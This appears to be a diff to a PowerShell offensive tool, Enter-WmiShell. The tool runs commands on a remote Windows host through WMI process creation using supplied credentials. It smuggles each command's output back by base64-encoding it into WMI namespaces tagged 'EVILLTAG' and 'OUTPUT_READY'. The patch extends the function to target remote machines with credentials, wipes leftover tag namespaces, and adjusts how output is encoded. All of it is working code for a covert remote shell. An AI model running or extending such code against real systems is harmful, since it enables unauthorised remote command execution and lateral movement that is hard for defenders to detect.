@@ -292,10 +292,11 @@ function Enter-WmiShell{
                 }
                 default { 
                     $remoteScript = @"
+                    Get-WmiObject -Namespace root\default -Query "SELECT * FROM __Namespace WHERE Name LIKE 'EVILLTAG%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                     `$wshell = New-Object -c WScript.Shell
                     function Insert-Piece(`$i, `$piece) {
                             `$count = `$i.ToString()
-	                    `$zeros = "0" * (6 - `$count.Length)
+	                        `$zeros = "0" * (6 - `$count.Length)
 	                        `$tag = "EVILLTAG" + `$zeros + `$count
 	                        `$piece = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(`$piece))
                             `$piece = `$piece -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
@@ -323,18 +324,18 @@ function Enter-WmiShell{
 "@
                     $scriptBlock = [scriptblock]::Create($remoteScript)
                     $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -NoExit -ScriptBlock $scriptBlock
-                    $null = Invoke-WmiMethod -Class win32_process -Name create -ArgumentList $encPosh
+                    $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $encPosh
                     
                     #-ComputerName $ComputerName -Credential $UserName
 
                     # Wait for vbScrpit to finish writing output to WMI namespaces
                     Start-Sleep -Seconds 1
                     $outputReady = ""
-                    do{$outputReady = Get-WmiObject -ComputerName $ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
+                    do{$outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
                     until($outputReady)
 
                     # Retrieve cmd output written to WMI namespaces 
-                    Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName
+                    Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Encoding Base64
                 }
             }
         }until($command -eq "exit")
